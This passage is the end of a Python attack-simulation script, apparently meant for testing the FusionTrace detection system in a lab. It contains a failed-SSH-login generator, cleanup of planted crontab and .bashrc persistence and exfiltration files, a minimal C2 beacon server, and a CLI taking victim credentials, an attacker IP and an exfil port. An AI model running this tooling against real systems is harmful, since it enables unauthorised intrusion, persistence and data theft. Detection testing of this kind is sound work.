                    password=wrong_pass,
                    timeout=3
                )
            except paramiko.AuthenticationException:
                pass  # 预期的失败
            except Exception:
                pass
            time.sleep(0.5)
        
        try:
            failed_client.close()
        except:
            pass
        
        print_result(True, f"产生了 {len(wrong_passwords[:3])} 次失败登录记录")
    
    def _wait(self):
        """等待间隔"""
        time.sleep(self.config.interval)
    
    def _cleanup(self):
        """清理攻击痕迹"""
        print("\n" + "-" * 40)
        print("  清理阶段")
        print("-" * 40)
        
        if not self.ssh:
            return
        
        print_action("恢复 Crontab", "")
        self.ssh.execute("crontab -l 2>/dev/null | grep -v 'FusionTrace Test' | crontab -")
        print_result(True, "Crontab 已恢复")
        
        print_action("清理 .bashrc", "")
        self.ssh.execute(f"sed -i '/FusionTrace Test/d' ~/.bashrc 2>/dev/null")
        print_result(True, ".bashrc 已清理")
        
        print_action("删除攻击文件", "")
        self.ssh.execute(f"rm -rf {self.work_dir}")
        self.ssh.execute(f"rm -f /tmp/.hidden_{self.tag}")
        print_result(True, "攻击文件已删除")
        
        # 清理本地文件
        local_exfil = os.path.expanduser(f"~/exfil_{self.tag}.bin")
        if os.path.exists(local_exfil):
            os.remove(local_exfil)
            print_result(True, "本地外泄文件已删除")


# ==========================================
# C2 服务器（可选）
# ==========================================

class SimpleC2Server:
    """简单的 C2 服务器用于接收 beacon"""
    
    def __init__(self, port: int = 8888):
        self.port = port
        self.server = None
        self.thread = None
    
    def start(self):
        """启动 C2 服务器"""
        handler = http.server.SimpleHTTPRequestHandler
        self.server = socketserver.TCPServer(("", self.port), handler)
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"C2 服务器启动在端口 {self.port}")
    
    def stop(self):
        """停止 C2 服务器"""
        if self.server:
            self.server.shutdown()


# ==========================================
# 主程序
# ==========================================

def main():
    parser = argparse.ArgumentParser(
        description="FusionTrace 全面攻击模拟脚本",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 完整攻击链
  python comprehensive_attack.py --victim 192.168.1.100 --user demo --password 'pass123'
  
  # 快速演示
  python comprehensive_attack.py --victim 192.168.1.100 --user demo --password 'pass123' --mode quick
  
  # 带 C2 回连
  python comprehensive_attack.py --victim 192.168.1.100 --user demo --password 'pass123' --attacker-ip 192.168.1.50

注意: 仅在授权的内网测试环境中使用！
        """
    )
    
    # 必需参数
    parser.add_argument("--victim", required=True, help="靶机 IP 地址")
    parser.add_argument("--user", required=True, help="SSH 用户名")
    
    # 认证参数（二选一）
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("--password", help="SSH 密码")
    auth_group.add_argument("--key", help="SSH 私钥文件路径")
    
    # 可选参数
    parser.add_argument("--port", type=int, default=22, help="SSH 端口 (默认: 22)")
    parser.add_argument("--attacker-ip", help="攻击者 IP (用于 C2 回连)")
    parser.add_argument("--c2-port", type=int, default=8888, help="C2 端口 (默认: 8888)")
    parser.add_argument("--exfil-port", type=int, default=9999, help="数据外泄接收端口 (默认: 9999)")
    parser.add_argument("--mode", choices=["full", "quick", "stealth", "demo"], 
                        default="full", help="攻击模式 (默认: full)")
    parser.add_argument("--interval", type=float, default=3.0, 
                        help="攻击阶段间隔秒数 (默认: 3)")
    parser.add_argument("--skip-cleanup", action="store_true", 
                        help="跳过清理步骤")
    parser.add_argument("--start-c2", action="store_true",
                        help="在本地启动 C2 服务器")
    
    args = parser.parse_args()
    
    # 创建配置
    config = AttackConfig(
        victim_ip=args.victim,
        victim_user=args.user,
        victim_password=args.password,
        victim_key=args.key,
        victim_port=args.port,
        attacker_ip=args.attacker_ip,
        c2_port=args.c2_port,
        exfil_port=args.exfil_port,
        mode=AttackMode(args.mode),
        interval=args.interval,
        skip_cleanup=args.skip_cleanup
    )
    
    # 可选：启动 C2 服务器
    c2_server = None
    if args.start_c2:
        c2_server = SimpleC2Server(args.c2_port)
        c2_server.start()
    
    # 运行攻击
    try:
        attacker = AttackSimulator(config)
        attacker.run()
    finally:
        if c2_server:
            c2_server.stop()


if __name__ == "__main__":
    main()
